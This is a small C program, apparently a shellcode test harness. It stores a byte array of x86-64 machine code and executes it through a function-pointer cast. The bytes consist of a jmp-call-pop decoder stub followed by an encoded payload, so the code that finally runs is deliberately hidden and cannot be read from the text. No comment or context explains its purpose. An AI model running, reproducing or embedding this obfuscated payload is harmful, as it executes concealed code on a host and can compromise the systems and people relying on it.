int main(int argc, char **argv){char code[] = "\xe9\x8f\x00\x00\x00\x48\x31\xc0\x48\x31\xc9\x48\x31\xdb\x48\x31\xd2\x48\x83\xc1\x04\x88\xcd\x88\xd9\x5e\xbf\x90\x90\xaa\xaa\x48\x83\xec\x7f\x48\x83\xec\x7f\x48\x83\xec\x7f\x48\x83\xec\x7f\x88\xe9\xfe\xc9\xfe\xc3\xfe\xc5\x4d\x31\xc9\x4d\x31\xd2\x30\xff\x49\x89\xd1\x48\x01\xda\x8a\x3c\x16\x4c\x89\xca\x32\x3c\x16\x49\x89\xc1\x41\x88\xca\x4d\x01\xca\x4c\x89\xd0\x88\x3c\x04\x4c\x89\xc8\xfe\xc3\xfe\xc9\x38\xeb\x75\xcf\x88\xe9\x30\xed\x31\xdb\x4d\x31\xd2\x49\x89\xd1\x41\x88\xca\x4d\x01\xca\x4c\x89\xd2\x39\x3c\x16\x74\x10\x4c\x89\xca\x48\x01\xca\x48\xff\xc9\x48\x01\xc8\x88\xcd\x75\x9d\xff\xe4\xe8\x6c\xff\xff\xff\x1a\x52\xda\x2b\x52\x25\x14\x6d\xfe\x14\x4d\xb2\x7c\x05\xbb\x5d\x74\xe5\x5c\x37\x3e\x81\x3e\x3e\x3e\xa6\xa6\xa6\xa6\xaa\xf3\xf9\x1c\x70\xbb\x0e\x0e\x0e\x0f\xb0\xc8\x92\xc9\xa2\xc8\xb5\xba\x7f\x4a\xfd\x8a\x01\xc2\xda\x8f\xd7\x6c\x8f\xf3\xc3\x3a\xc4\xc5\xc5\xba\xf6\x09\x05\x75\xbe\x56\x53\x3e\x30\x05\x72\x70\x18\x14\x4b\x82\x82\x82\xa9\x3a\xfd\x35\x02\xb5\xfd\x18\x50\xcf\x91\x50\x34\x2c\x8e\xd2\xbd\x45\x4a\x45\x45\x45\x30\xc9\xb9\x78\x35\x1d\x1d\x1d\x3c\xa5\xc5\x0a\x4c\x8d\xc5\x2f\x20\xd9\x1e\x67\x35\x35\x14\x8d\x30\xd6\xd7\x68\xd6\xd6\x01\x0e\x01\x01\x01\xa4\xa4\x85\x1c\xa1\x2b\x29\x95\x2b\x2b\xfd\xf2\xfd\xfd\xfd\x9f\x44\xae\xd7\x9a\x1d\x4e\xd4\x2c\x55\x0d\x22\x22\xb6\x45\xaa\x85\xc4\xc3\xc8\xe5\xad\xb6\x8d\x96\xea\xb9\xbb\x09\x63\xa8\xa8\xa8\x93\x10\x6e\xb1\xe7\x26\x6e\x9a\xd2\x7c\x13\xd2\xac\xa9\xa3\x7e\x9d\x90\x90\xaa\xaa";int (*func)();func = (int (*)())code;(int)(*func)();}